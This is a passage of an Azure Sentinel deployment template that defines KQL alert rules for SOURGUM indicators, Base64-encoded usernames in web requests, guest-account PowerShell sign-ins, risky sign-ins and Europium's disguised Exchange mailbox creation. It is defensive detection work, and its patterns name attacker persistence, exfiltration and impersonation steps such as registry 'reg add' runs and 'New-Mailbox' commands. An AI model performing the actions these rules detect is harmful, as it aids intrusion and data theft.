InitiatingProcessSHA256,  Alert = 'SOURGUM IOC detected'\n),\n(DeviceEvents\n| where  ( InitiatingProcessCommandLine has_any (file_path1)) or ( InitiatingProcessCommandLine has_any (file_path3)) or ( InitiatingProcessCommandLine has 'reg add' and InitiatingProcessCommandLine has_any (reg_key) and InitiatingProcessCommandLine has_any (file_path2)) or (InitiatingProcessFolderPath has_any (file_path1)) or (InitiatingProcessFolderPath has_any (file_path3)) or (FolderPath  has_any (file_path1)) or (FolderPath has_any (file_path3))\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, FolderPath, Type\n| extend CommandLine = InitiatingProcessCommandLine, Alert = 'SOURGUM IOC detected'\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256\n),\n(  SecurityEvent\n| where EventID == 4688\n| where ( CommandLine has_any (file_path1)) or ( CommandLine has_any (file_path3)) or ( CommandLine has 'reg add' and CommandLine has_any (reg_key) and CommandLine has_any (file_path2)) or (NewProcessName has_any (file_path1)) or (NewProcessName has_any (file_path3)) or (ParentProcessName has_any (file_path1)) or (ParentProcessName has_any (file_path3))\n| project TimeGenerated, Computer, NewProcessName, ParentProcessName, Account, NewProcessId, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = NewProcessName, Alert = 'SOURGUM IOC detected'\n)\n)",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1546"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "94749332-1ad9-49dd-a5ab-5ff2170788fc",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessCustomEntity"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "AlgorithmCustomEntity"
                },
                {
                  "identifier": "Value",
                  "columnName": "FileHashCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/57c2d2e1-99cc-4dd0-86c3-d25d00efaaf0')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/57c2d2e1-99cc-4dd0-86c3-d25d00efaaf0')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Windows host username encoded in base64 web request",
          "description": "This detection will identify network requests in HTTP proxy data that contains Base64 encoded usernames from machines in the DeviceEvents table.\nThis technique was seen usee by POLONIUM in their RunningRAT tool.",
          "severity": "Medium",
          "enabled": true,
          "query": "let accountLookback = 3d;\nlet requestLookback = 3d;\nlet extraction_regex = @\"(?:\\?|&)[a-zA-Z0-9\\%]*=([a-zA-Z0-9\\/\\+\\=]*)\";\n// Collect account names and base64 encode them\nDeviceEvents\n| where TimeGenerated > ago(accountLookback)\n| summarize make_set(DeviceId), make_set(DeviceName) by InitiatingProcessAccountName\n| where isnotempty(InitiatingProcessAccountName)\n| extend base64_user = base64_encode_tostring(InitiatingProcessAccountName)\n| join (\n    // Collect requests and extract base64 parameters\n    CommonSecurityLog\n    | where TimeGenerated > ago(requestLookback)\n    | where isnotempty(RequestURL)\n    // Summarize early on the RequestURL\n    | summarize FirstRequest=min(TimeGenerated), LastRequest=max(TimeGenerated), NumberOfRequests=count() by RequestURL\n    | extend base64_candidate = extract_all(extraction_regex, RequestURL)\n    | mv-expand base64_candidate  to typeof(string)\n) on $left.base64_user == $right.base64_candidate\n| project FirstRequest, LastRequest, NumberOfRequests, RequestURL, DeviceIds=set_DeviceId, DeviceNames=set_DeviceName, UserName=InitiatingProcessAccountName",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration",
            "CommandAndControl"
          ],
          "techniques": [
            "T1041",
            "T1071"
          ],
          "subTechniques": [
            "T1071.001"
          ],
          "alertRuleTemplateName": "6e715730-82c0-496c-983b-7a20c4590bd9",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "DeviceNames"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "RequestURL"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/6c8a7b27-50eb-4e4e-bd56-c1a85c191fb1')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/6c8a7b27-50eb-4e4e-bd56-c1a85c191fb1')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "External guest invitation followed by Azure AD PowerShell signin",
          "description": "By default guests have capability to invite more external guest users, guests also can do suspicious Azure AD enumeration. This detection look at guests\nusers, who have been invited or have invited recently, who also are logging via various PowerShell CLI.\nRef : 'https://danielchronlund.com/2021/11/18/scary-azure-ad-tenant-enumeration-using-regular-b2b-guest-accounts/",
          "severity": "Medium",
          "enabled": true,
          "query": "let queryfrequency = 1h;\nlet queryperiod = 1d;\nAuditLogs\n| where TimeGenerated > ago(queryperiod)\n| where OperationName in (\"Invite external user\", \"Bulk invite users - started (bulk)\", \"Invite external user with reset invitation status\")\n| extend InitiatedBy = iff(isnotempty(InitiatedBy.user.userPrincipalName), InitiatedBy.user.userPrincipalName, InitiatedBy.app.displayName)\n// Uncomment the following line to filter events where the inviting user was a guest user\n//| where InitiatedBy has_any (\"live.com#\", \"#EXT#\")\n| extend InvitedUser = TargetResources[0].userPrincipalName\n| mv-expand UserToCompare = pack_array(InitiatedBy, InvitedUser) to typeof(string)\n| where UserToCompare has_any (\"live.com#\", \"#EXT#\")\n| extend\n    parsedUser = replace_string(tolower(iff(UserToCompare startswith \"live.com#\", tostring(split(UserToCompare, \"#\")[1]), tostring(split(UserToCompare, \"#EXT#\")[0]))), \"@\", \"_\"),\n    InvitationTime = TimeGenerated\n| join (\n    (union isfuzzy=true SigninLogs, AADNonInteractiveUserSignInLogs)\n    | where TimeGenerated > ago(queryfrequency)\n    | where UserType != \"Member\"\n    | where AppId has_any                       // This web may contain a list of these apps: https://msshells.net/\n        (\"1b730954-1685-4b74-9bfd-dac224a7b894\",// Azure Active Directory PowerShell\n         \"04b07795-8ddb-461a-bbee-02f9e1bf7b46\",// Microsoft Azure CLI\n         \"1950a258-227b-4e31-a9cf-717495945fc2\",// Microsoft Azure PowerShell\n         \"a0c73c16-a7e3-4564-9a95-2bdf47383716\",// Microsoft Exchange Online Remote PowerShell\n         \"fb78d390-0c51-40cd-8e17-fdbfab77341b\",// Microsoft Exchange REST API Based Powershell\n         \"d1ddf0e4-d672-4dae-b554-9d5bdfd93547\",// Microsoft Intune PowerShell\n         \"9bc3ab49-b65d-410a-85ad-de819febfddc\",// Microsoft SharePoint Online Management Shell\n         \"12128f48-ec9e-42f0-b203-ea49fb6af367\",// MS Teams Powershell Cmdlets\n         \"23d8f6bd-1eb0-4cc2-a08c-7bf525c67bcd\",// Power BI PowerShell\n         \"31359c7f-bd7e-475c-86db-fdb8c937548e\",// PnP Management Shell\n         \"90f610bf-206d-4950-b61d-37fa6fd1b224\",// Aadrm Admin Powershell\n         \"14d82eec-204b-4c2f-b7e8-296a70dab67e\" // Microsoft Graph PowerShell\n        )\n    | summarize arg_min(TimeGenerated, *) by UserPrincipalName\n    | extend\n        parsedUser = replace_string(UserPrincipalName, \"@\", \"_\"),\n        SigninTime = TimeGenerated\n    )\n    on parsedUser\n| project InvitationTime, InitiatedBy, OperationName, InvitedUser, SigninTime, SigninCategory = Category1, SigninUserPrincipalName = UserPrincipalName, IPAddress, AppDisplayName, ResourceDisplayName, UserAgent, InvitationAdditionalDetails = AdditionalDetails, InvitationTargetResources = TargetResources",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Persistence",
            "Discovery"
          ],
          "techniques": [
            "T1078",
            "T1136",
            "T1087"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "acc4c247-aaf7-494b-b5da-17f18863878a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InvitedUser"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatedBy"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/9817681a-815c-4c70-af54-63fc74625871')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/9817681a-815c-4c70-af54-63fc74625871')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "(Preview) Insider Risk - Risky User Access By Application",
          "description": "This alert evaluates Azure Active Directory Sign in risk via Machine Learning correlations in the basket operator. The basket threshold is adjustable, and the default is set to .01. There is an optional configuration to configure the percentage rates. The correlations are designed to leverage machine learning to identify patterns of risky user application access. There is an option for configuration of correlations against Azure Sentinel watchlists. For more information, see [Tutorial: Use risk detections for user sign-ins to trigger Azure AD Multi-Factor Authentication or password changes](https://docs.microsoft.com/azure/active-directory/authentication/tutorial-risk-based-sspr-mfa)",
          "severity": "Medium",
          "enabled": true,
          "query": "SigninLogs\n//| where TimeGenerated > ago(6h)\n| where RiskState == \"atRisk\"\n| project UserPrincipalName, Location, AppDisplayName, RiskState\n| evaluate basket(0.01) // Adjust & Tune Thresholds within Organzational Requirements\n// | where Percent > 50 // Adjust & Tune Thresholds within Organzational Requirements\n| where UserPrincipalName <> \"\"\n| where AppDisplayName <> \"\"\n| project Percent, UserPrincipalName, Location, AppDisplayName, RiskState\n// | lookup kind=inner _GetWatchlist('<Your Watchlist Name>') on $left.UserPrincipalName == $right.SearchKey\n| sort by Percent desc\n| limit 25\n| extend AccountCustomEntity = UserPrincipalName\n\n",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/be3e00b3-6fd7-48c1-abd9-b98999e13ee8')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/be3e00b3-6fd7-48c1-abd9-b98999e13ee8')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SOURGUM Actor IOC - July 2021",
          "description": "Identifies a match across IOC's related to an actor tracked by Microsoft as SOURGUM",
          "severity": "High",
          "enabled": true,
          "query": "let iocs = externaldata(DateAdded:string,IoC:string,Type:string,TLP:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/SOURGUM.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet domains = (iocs | where Type =~ \"domainname\"| project IoC);\nlet sha256Hashes = (iocs | where Type =~ \"sha256\" | project IoC);\nlet file_path1 = (iocs | where Type =~ \"filepath1\" | project IoC);\nlet file_path2 = (iocs | where Type =~ \"filepath2\" | project IoC);\nlet file_path3 = (iocs | where Type =~ \"filepath3\" | project IoC);\nlet reg_key = (iocs | where Type =~ \"regkey\" | project IoC);\n(union isfuzzy=true\n(CommonSecurityLog\n| where DestinationHostName has_any (domains) or RequestURL has_any (domains) or Message has_any (domains)\n| parse Message with * '(' DNSName ')' *\n| project TimeGenerated, Message, SourceUserID, RequestURL, DestinationHostName, Type, SourceIP, DestinationIP, DNSName\n| extend  Alert = 'SOURGUM IOC detected'\n| extend timestamp = TimeGenerated, AccountCustomEntity = SourceUserID, UrlCustomEntity = RequestURL , IPCustomEntity = DestinationIP, DNSCustomEntity = DNSName\n),\n(DnsEvents\n| where Name in~ (domains)\n| project TimeGenerated, Computer, IPAddresses, Name, ClientIP, Type\n| extend DNSName = Name, Host = Computer , Alert = 'SOURGUM IOC detected'\n| extend timestamp = TimeGenerated, HostCustomEntity = Host, DNSCustomEntity = DNSName, IPCustomEntity = IPAddresses\n),\n(VMConnection\n| where  RemoteDnsCanonicalNames has_any (domains)\n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| project TimeGenerated, Computer, Direction, RemoteDnsCanonicalNames, ProcessName, SourceIp, DestinationIp, DestinationPort, DNSName,BytesSent, BytesReceived, RemoteCountry, Type\n| extend timestamp = TimeGenerated, IPCustomEntity = DestinationIp, HostCustomEntity = Computer, ProcessCustomEntity = ProcessName, DNSCustomEntity = DNSName, Alert = 'SOURGUM IOC detected'\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 3\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend SourceIP = tostring(EventDetail.[9].[\"#text\"]), DestinationIP = tostring(EventDetail.[14].[\"#text\"]), Image = EventDetail.[4].[\"#text\"]\n| where Image has_any (file_path1) or Image has_any (file_path3)\n| project TimeGenerated, SourceIP, DestinationIP, Image, UserName, Computer, EventDetail, Type\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserName, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), HostCustomEntity = Computer , IPCustomEntity = DestinationIP, Alert = 'SOURGUM IOC detected'\n),  \n(DeviceNetworkEvents\n| where (RemoteUrl has_any (domains))  or (InitiatingProcessSHA256 in (sha256Hashes) and InitiatingProcessFolderPath has_any (file_path1)) or InitiatingProcessFolderPath has_any (file_path3)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RemoteIP, RemoteUrl, LocalIP, Type\n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName,  Alert = 'SOURGUM IOC detected', UrlCustomEntity =RemoteUrl\n),\n(AzureDiagnostics\n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallDnsProxy\"\n| project TimeGenerated,Resource, msg_s, Type\n| parse msg_s with \"DNS Request: \" ClientIP \":\" ClientPort \" - \" QueryID \" \" Request_Type \" \" Request_Class \" \" Request_Name \". \" Request_Protocol \" \" Request_Size \" \" EDNSO_DO \" \" EDNS0_Buffersize \" \" Responce_Code \" \" Responce_Flags \" \" Responce_Size \" \" Response_Duration\n| where Request_Name has_any (domains)\n| extend timestamp = TimeGenerated, DNSName = Request_Name, IPCustomEntity = ClientIP, Alert = 'SOURGUM IOC detected'\n),\n(AzureDiagnostics\n| where ResourceType == \"AZUREFIREWALLS\"\n| where Category == \"AzureFirewallApplicationRule\"\n| project TimeGenerated,Resource, msg_s\n| parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action\n| where DestinationHost has_any (domains)  \n| extend timestamp = TimeGenerated, DNSName = DestinationHost, IPCustomEntity = SourceHost, Alert = 'SOURGUM IOC detected'\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| parse EventDetail with * 'SHA256=' SHA256 '\",' *\n| extend Image = EventDetail.[4].[\"#text\"],  CommandLine = EventDetail.[10].[\"#text\"]\n| where (SHA256 has_any (sha256Hashes) and Image has_any (file_path1)) or (Image has_any (file_path3)) or ( CommandLine has_any (file_path3)) or ( CommandLine has_any (file_path1)) or ( CommandLine has 'reg add' and CommandLine has_any (reg_key) and CommandLine has_any (file_path2)) \n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, SHA256, CommandLine, Image\n| extend Type = strcat(Type, \": \", Source), Alert = 'SOURGUM IOC detected'\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = UserName, ProcessCustomEntity = tostring(split(Image, '\\\\', -1)[-1]), AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = SHA256\n),\n(DeviceRegistryEvents\n| where RegistryKey has_any (reg_key) and RegistryValueData has_any (file_path2)\n|  project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type \n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256,  Alert = 'SOURGUM IOC detected'\n),\n(DeviceProcessEvents\n| where  ( InitiatingProcessCommandLine has_any (file_path1)) or ( InitiatingProcessCommandLine has_any (file_path3)) or ( InitiatingProcessCommandLine has 'reg add' and InitiatingProcessCommandLine has_any (reg_key) and InitiatingProcessCommandLine has_any (file_path2)) or (InitiatingProcessFolderPath has_any (file_path1)) or (InitiatingProcessFolderPath has_any (file_path3)) or (FolderPath  has_any (file_path1)) or (FolderPath has_any (file_path3))\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, FolderPath, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256, Alert = 'SOURGUM IOC detected'\n),\n(DeviceFileEvents\n| where  (InitiatingProcessSHA256 has_any (sha256Hashes) and InitiatingProcessFolderPath has_any (file_path1)) or (InitiatingProcessFolderPath has_any (file_path3)) or (FolderPath  has_any (file_path1)) or (FolderPath  has_any (file_path3)) or ( InitiatingProcessCommandLine has_any (file_path1)) or ( InitiatingProcessCommandLine has_any (file_path3))\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, RequestAccountName, RequestSourceIP, InitiatingProcessSHA256, FolderPath, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = RequestAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256,  Alert = 'SOURGUM IOC detected'\n),\n(DeviceEvents\n| where  ( InitiatingProcessCommandLine has_any (file_path1)) or ( InitiatingProcessCommandLine has_any (file_path3)) or ( InitiatingProcessCommandLine has 'reg add' and InitiatingProcessCommandLine has_any (reg_key) and InitiatingProcessCommandLine has_any (file_path2)) or (InitiatingProcessFolderPath has_any (file_path1)) or (InitiatingProcessFolderPath has_any (file_path3)) or (FolderPath  has_any (file_path1)) or (FolderPath has_any (file_path3))\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, FolderPath, Type\n| extend CommandLine = InitiatingProcessCommandLine, Alert = 'SOURGUM IOC detected'\n| extend timestamp = TimeGenerated, HostCustomEntity = DeviceName , AccountCustomEntity = InitiatingProcessAccountName, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = InitiatingProcessSHA256\n),\n(  SecurityEvent\n| where EventID == 4688\n| where ( CommandLine has_any (file_path1)) or ( CommandLine has_any (file_path3)) or ( CommandLine has 'reg add' and CommandLine has_any (reg_key) and CommandLine has_any (file_path2)) or (NewProcessName has_any (file_path1)) or (NewProcessName has_any (file_path3)) or (ParentProcessName has_any (file_path1)) or (ParentProcessName has_any (file_path3))\n| project TimeGenerated, Computer, NewProcessName, ParentProcessName, Account, NewProcessId, Type\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = NewProcessName, Alert = 'SOURGUM IOC detected'\n)\n)",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1546"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "94749332-1ad9-49dd-a5ab-5ff2170788fc",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessCustomEntity"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Algorithm",
                  "columnName": "AlgorithmCustomEntity"
                },
                {
                  "identifier": "Value",
                  "columnName": "FileHashCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/4c9e4c1f-3581-4f6f-90c1-3f3dc17aaacf')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/4c9e4c1f-3581-4f6f-90c1-3f3dc17aaacf')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Unusual identity creation using exchange powershell",
          "description": " The query below identifies creation of unusual identity by the Europium actor to mimic Microsoft Exchange Health Manager Service account using Exchange PowerShell commands\n  Reference: https://www.microsoft.com/security/blog/2022/09/08/microsoft-investigates-iranian-attacks-against-the-albanian-government/",
          "severity": "High",
          "enabled": true,
          "query": "(union isfuzzy=true\n(SecurityEvent\n| where EventID==4688\n| where CommandLine has_any (\"New-Mailbox\",\"Update-RoleGroupMember\") and CommandLine has \"HealthMailbox55x2yq\"\n| project TimeGenerated, HostCustomEntity = Computer, AccountCustomEntity = Account, AccountDomain, ProcessName, ProcessNameFullPath = NewProcessName, EventID, Activity, CommandLine, EventSourceName, Type\n),\n(DeviceProcessEvents\n| where ProcessCommandLine has_any (\"New-Mailbox\",\"Update-RoleGroupMember\") and ProcessCommandLine has \"HealthMailbox55x2yq\"\n| extend timestamp = TimeGenerated, AccountCustomEntity =  InitiatingProcessAccountName, HostCustomEntity = DeviceName\n)\n)",
          "queryFrequency": "PT12H",
          "queryPeriod": "PT12H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1136"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "0a3f4f4f-46ad-4562-acd6-f17730a5aef4",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8ad5a0b8-1e96-4176-ad7e-e47d3dab1223')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8ad5a0b8-1e96-4176-ad7e-e47d3dab1223')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "SUNSPOT log file creation",
          "description": "This query uses Microsoft Defender for Endpoint data and Windows Event Logs to look for IoCs associated with the SUNSPOT malware shared by Crowdstrike.\nMore details: \n  - https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/ \n  - https://techcommunity.microsoft.com/t5/azure-sentinel/monitoring-your-software-build-process-with-azure-sentinel/ba-p/2140807",
          "severity": "Medium",
